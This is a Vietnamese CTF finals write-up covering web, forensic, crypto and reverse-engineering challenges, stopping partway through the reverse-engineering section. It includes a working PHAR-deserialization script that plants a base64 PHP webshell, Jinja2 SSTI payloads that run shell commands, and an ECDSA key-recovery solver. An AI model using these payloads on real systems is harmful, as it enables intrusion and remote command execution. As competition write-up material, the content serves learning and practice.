---
title: "[Write-up] PTIT CTF 2025 – Finals"
published: 2025-09-21
tags: [CTF, PTITCTF]
category: Write-up
description: Thật vui khi ghi được điểm trong cuộc thi
draft: false
image: /assets/data/bannerupdate.png
author: MinhTuan, Trinh, Quang
---

# Web

## web_1

> Far

> http://103.197.184.163:5005

Khi rà soát mã nguồn, mình thấy dự án gồm các tệp `login.php`, `logout.php`, `register.php`, `index.php` và `genPDF.php`. Kiểm tra nhanh cho thấy các chức năng đăng nhập/đăng ký/đăng xuất không có điểm bất thường.

Mình sẽ tập trung vào `index.php` và `genPDF.php`

**1. index.php (Upload ảnh)**

```php
$allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
$fileExtension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
if (!in_array($file['type'], $allowedTypes) || strpos($fileExtension, 'php') !== false) { ... }

```

- Lọc `MIME = $\_FILES['type']` → giá trị do client tự đặt → dễ qua

- Chỉ chặn đuôi có chuỗi `php` → không chạm tới `.phar` / `.htaccess` / `.pht…`

- File được lưu trực tiếp trong `uploads/` (nằm trong webroot)

=> Kết luận: có thể upload bất kỳ tệp miễn là:

- Đặt header `type=image/png` (hoặc `jpeg/gif`)

- Đuôi file không chứa chuỗi `php` (ví dụ `.png`, `.phar`)

**2. genPDF.php (wkhtmltopdf qua Knp\Snappy)**

```php
$snappy->generateFromHtml($htmlContent, $savePath);
```

- Người dùng toàn quyền cung cấp `htmlContent` và đặc biệt là `savePath`

- Thư viện khi ghi file đích sẽ thực hiện những thao tác như `file_exists()`, `unlink()`, `fopen()`,… trên `savePath`

=> Kết luận: nếu đưa `savePath` dạng `phar://…`, PHP sẽ parse manifest PHAR để thao tác → tự động unserialize metadata. Nếu metadata chứa object có `__wakeup()` độc hại → code execution chain.

Class gadget sẵn có

```php
class PoC {
    private $a;
    private $b;
    function __wakeup() {
        $x = $this->a;
        $y = $this->b;
        return $x($y);
    }
}

```

**3. Ý tưởng khai thác**

- Upload một file PHAR (có thể đặt tên `.png` để qua lọc) vào uploads/.

- Metadata PHAR chứa object PoC với: `a = 'system'` `b = 'bash -c "echo <webshell_base64> | base64 -d > uploads/s.php"'`

```php
<?php

class PoC { private $a; private $b; }

$phar = new Phar("evil.phar");
$phar->startBuffering();

$phar->addFromString("dummy.txt", "x");

$payload = new PoC();

$ra = new ReflectionProperty('PoC', 'a');
$rb = new ReflectionProperty('PoC', 'b');
$ra->setAccessible(true);
$rb->setAccessible(true);

// 'a' sẽ là hàm thực thi; 'b' là lệnh. __wakeup() sẽ chạy: $x($y);
$ra->setValue($payload, 'system');

// Lệnh: ghi webshell vào uploads/s.php (base64 để tránh escape)
$cmd = 'bash -c "echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= | base64 -d > uploads/s.php"';
$rb->setValue($payload, $cmd);

$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");

// Nhúng metadata = object PoC
$phar->setMetadata($payload);
$phar->stopBuffering();

// Đổi tên sang .png để qua bộ lọc đuôi
rename("evil.phar", "evil.png");
echo "[+] Built evil.png (PHAR polyglot)\n";
```

- Gửi request tới `genPDF.php` với `savePath=phar://uploads/evil.png/out.pdf`
  → PHP đụng `phar://` ⇒ parse manifest ⇒ unserialize metadata ⇒ chạy `PoC::\_\_wakeup()` ⇒ thi hành `system()` → ghi webshell vào `uploads/s.php`

![](/assets/data/2025-09-22-19-06-55.png)
![](/assets/data/2025-09-22-19-08-37.png)

- Mở `uploads/s.php?cmd=...` để lấy shell và đọc flag

![](/assets/data/2025-09-22-19-09-41.png)

```
flag: PTITCTF{Ph4r_Deseri4liz4tion_he_he_he}
```

## web_2 - bounty

> http://103.197.184.163:5006/

Một bài web vận dụng các kiến thức ngôn ngữ lập trình `javascript` để vượt qua 4 câu hỏi khá dễ

**1. Stage: 0 / 4**

```
(![]+[])[+[]] + ([][[]]+[])[+!+[]] + ({}+[])[+!+[]+!+[]] == input
```

`(![]+[])[+[]]`

- ![ ] → false
- false + [ ] → "false"
- +[ ] → 0

=> "false"[0] → "f"

`([][[]]+[])[+!+[]]`

- []\[[]] → undefined
- undefined + [] → "undefined"
- !+[] → !0 → true → 1
- "undefined"[1] → "n"

`({}+[])[+!+[]+!+[]]`

- {} khi cộng [] → "[object Object]"
- !+[] → true → 1
- +!+[]+!+[] → 1+1 → 2
- "[object Object]"[2] → "b"

`input == fnb`

**2. Stage: 1 / 4**

```
typeof a == 'number' && a !== NaN && (a - 1 < a) == false
```

Nhập bất kỳ chuỗi không bắt đầu bằng chữ số để `parseInt` trả về `NaN`

- typeof NaN === 'number'
- NaN !== NaN là true
- (NaN - 1 < NaN) là false, nên == false

**3. Stage: 2 / 4**

```
Object.is(0, a) == false && Math.abs(1 / a) > 1
```

- a = parseInt("-0") → -0

- Object.is(0, -0) === false

- 1 / -0 = -Infinity → Math.abs(...) = Infinity > 1

**4. Stage: 3 / 4**

```
[] == input && ![[]] == input
```

nhập chuỗi rỗng

- [] == '' → true (array rỗng → '')
- ![[]] là false, và false == '' → true ('' → 0)

```
flag: PTITCTF{Js_iS_The_best_BAD!!!}
```

## web_3

> Template

> http://103.197.184.163:5003

Đọc source code có thể thấy trang web bị dính lỗ hổng `SSTI`

```
description = ...  # lấy từ HTML của URL người dùng nhập
escaped_description = html.escape(description)
escaped_description = Template(description).render()  # <-- biến 'description' thành template & render!!!
```

Trang web render trực tiếp nội dung do bên ngoài kiểm soát bằng `jinja2.Template`. Việc `escape` trước đó bị vô hiệu vì render lại chính chuỗi chưa-escape (description), rồi kết quả render (có thể chứa HTML hoặc output của lệnh hệ thống) mới được truyền vào template Flask

Mình sẽ dùng `ngrok` để host một url với file poc `exploit.html` do mình kiểm soát

```html
<meta name="description" content="{{7*7}}" />
```

![](/assets/data/2025-09-22-19-41-42.png)

Như vậy đây là `SSTI Jinja2`

Trong `Jinja2 classic`, có thể gọi Python builtins để thực thi lệnh hệ thống

```python
<meta name="description" content="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}">

```

```python
<meta name="description" content="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}">
```

![](/assets/data/2025-09-22-19-46-02.png)

```
flag: PTITCTF{bai_n4y_x4m_v~i}
```

# Forensic

## HubLot

> Just a Song 🎵 (Steganography)<br>
> Bạn nhận được một file nhạc MP3. Hãy lắng nghe…. Mọi thứ bạn cần đều nằm trong chính file — không cần tìm kiếm bên ngoài.

Ta được cung cấp 1 file `challenge.mp3`, mở lên nghe thì đây là mootk file `.mp3` bình thường

Đầu tiên mình sữ sử dụng công cụ `exiftool` để xem toàn bộ thông tin của file

```
$exiftool challenge.mp3
ExifTool Version Number         : 13.25
File Name                       : challenge.mp3
Directory                       : .
File Size                       : 49 kB
File Modification Date/Time     : 2025:09:21 14:01:29+07:00
File Access Date/Time           : 2025:09:21 14:01:40+07:00
File Inode Change Date/Time     : 2025:09:21 14:01:40+07:00
File Permissions                : -rw-r--r--
File Type                       : MP3
File Type Extension             : mp3
MIME Type                       : audio/mpeg
MPEG Audio Version              : 1
Audio Layer                     : 3
Audio Bitrate                   : 128 kbps
Sample Rate                     : 48000
Channel Mode                    : Stereo
MS Stereo                       : Off
Intensity Stereo                : Off
Copyright Flag                  : False
Original Media                  : False
Emphasis                        : None
ID3 Size                        : 89
Comment                         : Hint: base64 -> SGVoZUBA
Encoder Settings                : Lavf59.27.100
Duration                        : 3.08 s (approx)
```

Có thể thấy phần `comment` có một đoạn mã base64 `SGVoZUBA -> Hehe@@` có thể là mật khẩu

Tiếp theo sử dụng `binwalk` để trích xuất các tệp ẩn bên trong file

```
$binwalk -e challenge.mp3

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
49241         0xC059          Zip archive data, encrypted at least v2.0 to extract, compressed size: 37, uncompressed size: 25, name: flag.txt
```

Có một tệp `.zip` ẩn, bên trong là file `flag.txt` được mã hóa mật khẩu

Sử dụng chuỗi ở trên làm mật khẩu để giải nén tệp `.zip` ta sẽ lấy được flag

```
flag: PTITCTF{Warm_Up_so_Crazy}
```

## Candle - bounty

> Một bản nhạc, một ngọn nến, một trò chơi. Thắp lên rồi xem bạn tìm thấy gì, và tôi sẽ để lại cho bạn 1 mẩu giấy, có gắn liền với các ngọn nến để bạn dễ dàng tìm kiếm hơn nhé. 🕯️🎼

Tiếp tục là một file `.mp3` khác

Sử dụng `binwalk` để trích xuất các tệp ẩn trong file

```
$binwalk -e laugh.mp3
```

Trích xuất được một tệp `.rar`, giải nén ta được 30 mảnh của một ảnh `QR` và một file `manifest.json`

Phân tích file `manifest.json` thì thấy có vẻ đây là file để sắp xếp lại các mảnh thành một ảnh lớn với các chỉ số `r, c` hàng và cột

Viết một mã python để ghép lại theo file `manifest.json` nhưng không thành công, có vẻ như `manifest.json` đã bị đảo lộn thứ tự các ảnh

Sử dụng một chút `chat gpt` để viết một mã python sử dụng `random init + hill climbing + restarts` để sắp xếp lại các mảnh

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tự xếp 30 mảnh (5x6) theo khớp biên trắng/đen.
- Không dùng manifest; tìm hoán vị tối ưu theo điểm khớp cạnh L/R và T/B.
- Heuristic: random init + hill climbing + restarts.
- Lưu 3 ảnh: best_debug.png (ghi nhãn), best.png (ảnh ghép), best_cropped.png (crop 490x490).
"""

import os, random, math, itertools, time
from PIL import Image, ImageDraw, ImageFont

ROWS, COLS = 5, 6
TW, TH = 82, 98
ORIG_W, ORIG_H = 490, 490
N = ROWS * COLS

# === Load tiles & precompute edges (nhị phân 0/1) ===
def binarize(im):
    im = im.convert("L").resize((TW, TH))
    # Ngưỡng 128: QR đen trắng là ổn
    return (im.point(lambda p: 0 if p < 128 else 255)).load()

def edges(im):
    px = binarize(im)
    # Mỗi cạnh là list 0/1 theo chiều dài cạnh
    top = [1 if px[x,0]==0 else 0 for x in range(TW)]
    bot = [1 if px[x,TH-1]==0 else 0 for x in range(TW)]
    lef = [1 if px[0,y]==0 else 0 for y in range(TH)]
    rig = [1 if px[TW-1,y]==0 else 0 for y in range(TH)]
    return {"T":top, "B":bot, "L":lef, "R":rig}

def hamming(a, b):
    # điểm KHỚP: số bit giống nhau (dài bằng nhau)
    return sum(1 if ai==bi else 0 for ai,bi in zip(a,b))

def load_tiles():
    tiles = []
    for i in range(N):
        fn = f"piece_{i:02d}.png"
        if not os.path.exists(fn):
            raise FileNotFoundError(fn)
        im = Image.open(fn)
        tiles.append({"id": i, "fn": fn, "im": im, "edges": edges(im)})
    return tiles

# === Scoring ===
def score_grid(order, tiles):
    # order: list length N → index tile đặt vào vị trí k
    # Tổng điểm khớp các cặp L-R và T-B
    s = 0
    for r in range(ROWS):
        for c in range(COLS):
            idx = r*COLS + c
            t = tiles[order[idx]]
            # So với phải
            if c+1 < COLS:
                tR = t["edges"]["R"]
                u  = tiles[order[idx+1]]
                uL = u["edges"]["L"]
                s += hamming(tR, uL)
            # So với dưới
            if r+1 < ROWS:
                tB = t["edges"]["B"]
                d  = tiles[order[idx+COLS]]
                dT = d["edges"]["T"]
                s += hamming(tB, dT)
    return s

def neighbor_swap(order):
    i, j = random.sample(range(N), 2)
    order[i], order[j] = order[j], order[i]
    return i, j

def hill_climb(tiles, iters=30000):
    # Khởi tạo ngẫu nhiên
    order = list(range(N))
    random.shuffle(order)
    best = order[:]
    best_s = score_grid(best, tiles)

    cur = order[:]
    cur_s = best_s

    for t in range(iters):
        i, j = random.sample(range(N), 2)
        cur[i], cur[j] = cur[j], cur[i]
        new_s = score_grid(cur, tiles)
        if new_s >= cur_s:       # nhận nếu tốt hơn hoặc bằng
            cur_s = new_s
            if new_s > best_s:
                best_s = new_s
                best = cur[:]
        else:
            # hoàn tác
            cur[i], cur[j] = cur[j], cur[i]

        # Thỉnh thoảng nhảy ngẫu nhiên nhỏ để thoát local optimum
        if t % 2000 == 0 and t > 0:
            a, b = random.sample(range(N), 2)
            cur[a], cur[b] = cur[b], cur[a]
            cur_s = score_grid(cur, tiles)

    return best, best_s

def multi_restart(tiles, rounds=12, iters=25000):
    best = None
    best_s = -1
    for k in range(rounds):
        o, s = hill_climb(tiles, iters)
        if s > best_s:
            best, best_s = o, s
            print(f"[round {k+1}] best score = {best_s}")
    return best, best_s

# === Render kết quả ===
def render(order, tiles, out_img="best.png", out_dbg="best_debug.png"):
    W, H = COLS*TW, ROWS*TH
    canvas = Image.new("L", (W, H), 255)
    dbg = Image.new("RGB", (W, H), "white")
    draw = ImageDraw.Draw(dbg)
    for r in range(ROWS):
        for c in range(COLS):
            k = r*COLS + c
            t = tiles[order[k]]
            tile = t["im"].convert("L").resize((TW, TH))
            canvas.paste(tile, (c*TW, r*TH))

            # debug border + text
            draw.rectangle([c*TW, r*TH, c*TW+TW-1, r*TH+TH-1], outline="red", width=1)
            draw.text((c*TW+3, r*TH+3), f"{t['fn']}", fill="red")

    canvas.save(out_img)
    dbg.save(out_dbg)
    # crop về kích thước gốc
    canvas.crop((0,0,ORIG_W,ORIG_H)).save("best_cropped.png")

def main():
    random.seed(0x1337)
    tiles = load_tiles()
    print("[*] tiles loaded:", len(tiles))
    best, best_s = multi_restart(tiles, rounds=16, iters=30000)
    print("[+] final score:", best_s)
    render(best, tiles)

if __name__ == "__main__":
    main()

```

Và đây là kết quả

![](/assets/data/2025-09-22-20-54-18.png)

Scan ảnh QR dẫn ta đến một bài đăng trên `X`

`https://x.com/hanh588344/status/1965362524624457958`

Để ý kĩ phần `Replies` có một mã `rot13` giải mã dẫn ta đến một project trên github

`https://github.com/AFatc4t/notthetruth/blob/main/candlegame.exe`

Tải về và chạy thử

![](/assets/data/2025-09-22-21-00-47.png)

Đây là một chương trình đặt lệnh `LONG SHORT`, có vẻ như phải chơi đến một số tiền khá lớn mới nhận được flag

Cách nhanh nhất là dùng `Cheat Engine` tìm biến lưu `Backroll` chỉnh số dư lên xem có gì bất ngờ không

![](/assets/data/2025-09-22-21-07-37.png)

Và như vậy chúng ta đã cheat thành công và có flag

```
flag: PTITCTF{PTIT_Futures_is_a_crypt0currency_futures_trading_platf0rm_and_sh0rt_BTC_set_up_n0w!!!}
```

# Crypto

## Exodia’s Ritual-bounty

> Trước mắt bạn là vô số lá bài Yu-Gi-Oh!, nhưng tất cả chỉ là vật hy sinh. Để phá phong ấn, bạn buộc phải hiến tế toàn bộ những lá bài khác để có được 5 bộ phận của Exodia. Chỉ khi tập hợp đủ Exodia sẽ được triệu hồi, phong ấn nghìn năm sẽ tan vỡ, sức mạnh tối thượng sẽ là của bạn. 🃏🃏<br>
> nc 103.197.184.48 41337

Đọc source code ta có thể thấy

- Server cung cấp lệnh:

  - `public_key` – khoá công khai (secp256k1, nén)
  - `choices` – 12 lá bài (đã **sort**, **không** phải thứ tự bí mật)
  - `vaults` – danh sách vault, mỗi vault có `id` (UUID) và `signature = r||s` (hex 64+64)
  - `unlock_exodia <head> <Larm> <Rarm> <Lleg> <Rleg>` – XOR 5 mảnh phải bằng **d**

- Ta cần tìm **d** để gửi:  
  `unlock_exodia <d_hex> 00 00 00 00`

---

- **Nonce `k`** được tạo từ **12** giá trị 16-bit (cắt thấp 16 bit của 12 id), theo **một hoán vị bí mật**

  k = sum\_{j=0..11}( v[perm[j]] << (16\*j) ) mod n <br>
  v[i] = id[i] & 0xFFFF

- **Chữ ký ECDSA** trên thông điệp

  z = SHA256(uuid)<br>
  s = k^{-1} _ (z + rd) mod n <br>
  => d = (sk - z) _ r^{-1} mod n

- **Low-s**: nếu server ép s <= n/2, cần thử cả hai:

  d1 = (s*k - z) * r^{-1} mod n <br>
  d2 = ((n - s)\*k - z)\* r^{-1} mod n

---

Vì `R = k*G = sum( v[perm[j]] * (2^(16*j) * G) )`, ta chia 12 vị trí thành 2 nửa để ghép giữa chừng

**1. Tiền tính:**

- for j in 0..11:
- Q[j] = (2^(16*j) mod n) * G
- for i in 0..11, j in 0..11:
- C[i][j] = v[i] \* Q[j]

**2. Nửa trái (j = 0..5):**

- Duyệt mọi hoán vị chọn 6 từ 12 (12P6 = 665,280)
- Cộng 6 điểm tương ứng để ra `S_left`
- Lưu `compress(S_left) -> (mask, perm_left)` trong hashmap

**3. Nửa phải (j = 6..11):**

- Duyệt 12P6, cộng ra `S_right`
- Với từng `S_right`, tính `target = R - S_right`
- Nếu `compress(target)` có trong map và mask không giao → ghép hoán vị đầy đủ, dựng lại `k`

**4. Kiểm tra `x(k*G) % n == r`**

**5. Tính `d`:**

- d1 = (s*k - z) * r^{-1} mod n
- d2 = ((n - s)_k - z) _ r^{-1} mod n

**6. So với `public_key` để chọn đúng d, hoặc thử lần lượt**

**7. Gửi:**

- unlock_exodia <d_hex> 00 00 00 00

---

full solve

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
YugiVault — Exodia (CTF) solver (final)
- Kết nối server, lấy 12 cards (choices) và 1 chữ ký (vaults)
- MITM khôi phục nonce k: k = sum_{j=0..11} (v_{π(j)} << (16*j)), v_i = id_i & 0xFFFF
- ECDSA: d = (s*k - z) * r^{-1} mod n với z = SHA256(uuid)
- Xử lý low-s (thử d1/d2 hoặc đối chiếu public_key)
- Gửi unlock_exodia <d_hex> 00 00 00 00, in toàn bộ phản hồi + trích FLAG
"""

import socket, sys, time, hashlib, json, re, itertools
from typing import List, Tuple, Dict, Optional

# ===== secp256k1 =====
P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
A  = 0
B  = 7
Gx = 55066263022277343669578718895168534326250603453777594175500187360389116729240
Gy = 32670510020758816978083085130507043184471273380659243275938904335757337482424
G  = (Gx, Gy)

class ZeroError(Exception): pass

def point_add(Pt, Qt):
    if Pt is None: return Qt
    if Qt is None: return Pt
    x1, y1 = Pt; x2, y2 = Qt
    if x1 == x2 and (y1 + y2) % P == 0: return None
    if Pt == Qt:
        s = ((3*x1*x1 + A) * pow(2*y1 % P, -1, P)) % P
    else:
        s = ((y2 - y1) * pow((x2 - x1) % P, -1, P)) % P
    x3 = (s*s - x1 - x2) % P
    y3 = (s*(x1 - x3) - y1) % P
    return (x3, y3)

def scalar_mult(k: int, Pt=G):
    if k % N == 0 or Pt is None: return None
    if k < 0: return scalar_mult(-k, (Pt[0], (-Pt[1]) % P))
    result = None; addend = Pt
    while k:
        if k & 1: result = point_add(result, addend)
        addend = point_add(addend, addend)
        k >>= 1
    return result

def compress_point(Pt) -> bytes:
    x, y = Pt
    return bytes([0x02 if (y % 2 == 0) else 0x03]) + x.to_bytes(32, 'big')

def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()

def sqrt_mod_p(a: int) -> int:
    # P % 4 == 3
    return pow(a, (P + 1) // 4, P)

def r_to_R_candidates(r: int):
    cands = []
    for x in {r % N, (r % N) + N}:
        if x >= P: continue
        rhs = (pow(x, 3, P) + 7) % P
        y = sqrt_mod_p(rhs)
        if (y*y) % P == rhs:
            cands.append((x, y))
            if y != 0:
                cands.append((x, (-y) % P))
    uniq, seen = [], set()
    for t in cands:
        if t in seen: continue
        seen.add(t); uniq.append(t)
    return uniq

# ===== Socket helpers =====
ANSI_RE = re.compile(r'\x1b\[[0-9;]*[A-Za-z]')

def sendline(sock, s: str):
    sock.sendall((s.rstrip() + "\n").encode())

def recv_until_prompt(sock, prompt=b"> ", hard_timeout=6.0) -> bytes:
    buf = b""; t0 = time.time(); sock.settimeout(1.0)
    while time.time() - t0 < hard_timeout:
        try:
            chunk = sock.recv(4096)
            if not chunk: break
            buf += chunk
            if prompt in buf: break
        except Exception:
            pass
    return buf

def try_extract_json_text(text: str) -> Optional[object]:
    m = re.search(r'(\[.*\]|\{.*\})', text, re.S)
    if m:
        try:
            return json.loads(m.group(1))
        except Exception:
            pass
    for open_ch, close_ch in [('[', ']'), ('{', '}')]:
        start = text.find(open_ch)
        if start == -1: continue
        depth, in_str, esc = 0, False, False
        for i in range(start, len(text)):
            ch = text[i]
            if in_str:
                if esc: esc = False
                elif ch == '\\': esc = True
                elif ch == '"': in_str = False
            else:
                if ch == '"': in_str = True
                elif ch == open_ch: depth += 1
                elif ch == close_ch:
                    depth -= 1
                    if depth == 0:
                        chunk = text[start:i+1]
                        try:
                            return json.loads(chunk)
                        except Exception:
                            break
    return None

def recv_json(sock, hard_timeout=8.0):
    buf = b""; t0 = time.time(); sock.settimeout(1.0)
    while time.time() - t0 < hard_timeout:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            text = ANSI_RE.sub("", buf.decode("utf-8", errors="ignore"))
            js = try_extract_json_text(text)
            if js is not None:
                return js, text
        except Exception:
            pass
    text = ANSI_RE.sub("", buf.decode("utf-8", errors="ignore"))
    raise ValueError("JSON not found\n---BEGIN DUMP---\n" + text[:4000] + "\n---END DUMP---")

def recv_all(sock, idle_timeout=1.2, hard_timeout=10.0):
    buf = b""
    t0 = time.time()
    last = time.time()
    sock.settimeout(0.5)
    while time.time() - t0 < hard_timeout:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            last = time.time()
        except Exception:
            if time.time() - last >= idle_timeout:
                break
    return buf

# ===== MITM khôi phục k =====
def recover_k(v16_list: List[int], r: int, uuid_str: str, debug=False):
    # Hệ số 2^(16j) mod n
    coeffs = [1]
    two16 = pow(2, 16, N)
    for _ in range(1, 12):
        coeffs.append((coeffs[-1] * two16) % N)

    # C[i][j] = (v_i * 2^(16j))·G
    C = [[scalar_mult((v16_list[i] * coeffs[j]) % N, G) for j in range(12)] for i in range(12)]

    pos_low  = list(range(0, 6))
    pos_high = list(range(6, 12))
    idxs = list(range(12))

    left_map: Dict[bytes, List[Tuple[int, Tuple[int, ...]]]] = {}
    for perm in itertools.permutations(idxs, 6):  # 12P6
        mask = 0
        S = None
        for p_idx, j in enumerate(pos_low):
            i = perm[p_idx]
            mask |= (1 << i)
            S = point_add(S, C[i][j])
        cp = compress_point(S)
        left_map.setdefault(cp, []).append((mask, perm))
    if debug:
        print(f"[+] Left map built: {len(left_map)} buckets")

    def right_iter():
        for perm in itertools.permutations(idxs, 6):
            mask = 0
            S = None
            for p_idx, j in enumerate(pos_high):
                i = perm[p_idx]
                mask |= (1 << i)
                S = point_add(S, C[i][j])
            yield S, mask, perm

    R_cands = r_to_R_candidates(r)
    if debug:
        print(f"[+] R candidates: {len(R_cands)}")

    inv = lambda Pt: (Pt[0], (-Pt[1]) % P) if Pt is not None else None

    for Rx, Ry in R_cands:
        R = (Rx, Ry)
        for S_right, mask_right, perm_right in right_iter():
            target = point_add(R, inv(S_right))  # R - S_right
            if target is None:
                continue
            cp_t = compress_point(target)
            lst = left_map.get(cp_t)
            if not lst:
                continue
            for (mask_left, perm_left) in lst:
                if (mask_left & mask_right) != 0:
                    continue
                pos2idx = {}
                for p_idx, j in enumerate(pos_low):
                    pos2idx[j] = perm_left[p_idx]
                for p_idx, j in enumerate(pos_high):
                    pos2idx[j] = perm_right[p_idx]
                k = 0
                for j in range(12):
                    i = pos2idx[j]
                    k += (v16_list[i] & 0xFFFF) << (16 * j)
                k %= N
                RG = scalar_mult(k, G)
                if RG is None or (RG[0] % N) != (r % N):
                    continue
                if debug:
                    print("[+] Found k:", hex(k))
                return k
    raise RuntimeError("k not found")

# ===== Orchestrate =====
def solve(host="103.197.184.48", port=41337, debug=False):
    s = socket.create_connection((host, port), timeout=5.0)
    _ = recv_until_prompt(s)

    # Đồng bộ buffer (không bắt buộc)
    try:
        sendline(s, "help")
        _ = recv_until_prompt(s)
    except Exception:
        pass

    # CHOICES
    sendline(s, "choices")
    choices_js, dump1 = recv_json(s)
    if debug:
        print("[+] choices dump head:\n", dump1[:200])

    ids_sorted = []
    for x in choices_js:
        if isinstance(x, dict):
            if 'id' in x:
                ids_sorted.append(int(x['id']))
            elif 'power' in x:
                ids_sorted.append(int(x['power']))
            else:
                raise ValueError("choices item missing id/power")
        else:
            ids_sorted.append(int(x))
    if len(ids_sorted) != 12:
        raise ValueError(f"Expected 12 ids, got {len(ids_sorted)}")

    v16 = [i & 0xFFFF for i in ids_sorted]
    if debug:
        print("[+] 12 low16:", v16)

    # VAULTS
    sendline(s, "vaults")
    vaults_js, dump2 = recv_json(s)
    if debug:
        print("[+] vaults dump head:\n", dump2[:200])

    v0 = vaults_js[0] if isinstance(vaults_js, list) else vaults_js
    uuid_str = str(v0.get("id") or v0.get("uuid") or v0.get("uid"))
    sig_hex  = v0.get("signature") or v0.get("sig") or v0.get("ecdsa")
    if not uuid_str or not sig_hex:
        raise ValueError("vault object missing id/signature")

    sig_hex = sig_hex.strip().lower()
    if len(sig_hex) != 128:
        raise ValueError(f"signature length != 128: {len(sig_hex)}")
    r = int(sig_hex[:64], 16)
    s_val = int(sig_hex[64:], 16)

    if debug:
        print("[+] Using vault:", uuid_str)
        print("[+] r, s:", hex(r), hex(s_val))

    # MITM -> k
    k = recover_k(v16, r, uuid_str, debug=debug)

    # Xử lý low-s (d1/d2) và chọn d theo public_key nếu có
    z = int.from_bytes(sha256(uuid_str.encode()), 'big') % N
    rinv = pow(r, -1, N)
    d1 = ((s_val * k - z) * rinv) % N
    d2 = (((N - s_val) * k - z) * rinv) % N  # nếu server ép low-s

    # Thử lấy public_key để chọn đúng d
    chosen_d = None
    try:
        sendline(s, "public_key")
        text = recv_until_prompt(s).decode("utf-8", errors="ignore")
        m = re.search(r'([0-9a-fA-F]{66})', text)
        if m:
            server_pub = m.group(1).lower()
            def pub_from_d(d):
                Px, Py = scalar_mult(d, G)
                return ('02' if (Py % 2 == 0) else '03') + format(Px, '064x')
            if pub_from_d(d1) == server_pub:
                chosen_d = d1
            elif pub_from_d(d2) == server_pub:
                chosen_d = d2
            if debug:
                print("[+] Selected d via pubkey:", "d1" if chosen_d == d1 else ("d2" if chosen_d == d2 else "None"))
    except Exception:
        pass

    # Fallback: chưa xác định được thì thử d1 trước, nếu fail sẽ thử d2
    tried_both = False
    for attempt_d in ([chosen_d] if chosen_d is not None else [d1, d2]):
        head = format(attempt_d, '064x')
        sendline(s, f"unlock_exodia {head} 00 00 00 00")
        resp = recv_all(s, idle_timeout=1.2, hard_timeout=10.0).decode("utf-8", errors="ignore")
        print(resp)
        m = re.search(r'(PTIT\{[^}]+\})', resp)
        if m:
            print("FLAG:", m.group(1))
            return
        # nếu server không đóng kết nối và báo sai, thử d còn lại
        tried_both = True

    # Nếu tới đây vẫn chưa thấy flag: thử nốt d còn lại (khi đã chọn theo pubkey nhưng sai do format khác)
    if not tried_both and chosen_d is not None:
        other = d2 if chosen_d == d1 else d1
        head = format(other, '064x')
        sendline(s, f"unlock_exodia {head} 00 00 00 00")
        resp = recv_all(s, idle_timeout=1.2, hard_timeout=10.0).decode("utf-8", errors="ignore")
        print(resp)
        m = re.search(r'(PTITCTF\{[^}]+\})', resp)
        if m:
            print("FLAG:", m.group(1))

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "103.197.184.48"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 41337
    debug = bool(int(sys.argv[3])) if len(sys.argv) > 3 else False
    solve(host, port, debug)

```

```
python3 solve.py
public_key: 034e0789e68d6ebff0c9883f32257cbf45624b9e3963f165c3b22acf03d91c1a3c

> Exodia assembled!
> FLAG: PTITCTF{Exodia_the_forbidden_one_has_been_assembled}
> FLAG: CTF{Exodia_the_forbidden_one_has_been_assembled}

```

# Reverse Engineering

## Carnival Show - bounty

> Một buổi diễn kỳ lạ, nơi các function mặc đủ loại mặt nạ, nhảy múa lung tung và lừa bạn bằng những chiêu trò không ai hiểu nổi. 🤹‍♂️🤡<br>
> Mọi thứ trông có vẻ “nghiêm túc”, nhưng thật ra chỉ là một màn kịch hỗn loạn. Liệu bạn có đủ kiên nhẫn để tìm ra sự thật ẩn sau tấm màn? 🎩✨

Bước đầu kiểm tra chương trình ta thấy đây là fle nhị phân Linux 64-bit, đã bị làm rối.

![](/assets/data/2025-09-22-22-13-27.png)

Chạy thử chương trình thì chỉ thấy hiện lên 1 dòng chữ

![](/assets/data/2025-09-22-22-13-40.png)

Sử dụng ida64 để tiến hành phân tích. Bắt đầu tìm hàm main của challenge

![](/assets/data/2025-09-22-22-14-01.png)

Hàm main chỉ có 1 lệnh là in ra đoạn chữ trên. Vì vậy, chúng ta cần xem qua các hàm khác trong chương trình:

![](/assets/data/2025-09-22-22-14-06.png)

Sau khi kiểm tra 1 lượt ta thấy ta thấy đa số các hàm ngoài khối đều phục vụ chống debug / hardening.

![](/assets/data/2025-09-22-22-14-34.png)
![](/assets/data/2025-09-22-22-14-43.png)
![](/assets/data/2025-09-22-22-14-51.png)

Xem xét them trong hàm sub_1300 ta có thể phát hiện ra các phép biến đổi flag
=> Mục tiêu ta cần đảo ngược các phép biến đổi để khôi phục flag plaintext

**1. Đầu tiên ta thấy Ở cuối phần đọc input s, chương trình chỉ tiếp tục kiểm tra**

![](/assets/data/2025-09-22-22-15-55.png)

Tức là chiều dài sau mã hoá “base64” (kiểu tuỳ biến) phải đúng 60 ký tự ⇒

- strlen(s) ∈ {43, 44, 45} (không tính newline)

Như vậy flag plaintext có độ dài 43–45 ký tự

**2. Mã hoá “Base64-QWERTY” (padding ‘.’)**

- Khối sau đây tạo ra chuỗi encode dài 60 ký tự (ghi vào vùng rlimits 4 byte/nhóm):

![](/assets/data/2025-09-22-22-16-50.png)

- **Alphabet** (thay vì chuẩn Base64) là
  ![](/assets/data/2025-09-22-22-17-19.png)

- Padding dùng dấu ‘.’ (khác = của chuẩn Base64)
- Gọi chuỗi mã hoá (trước khi xoay) là enc[60]

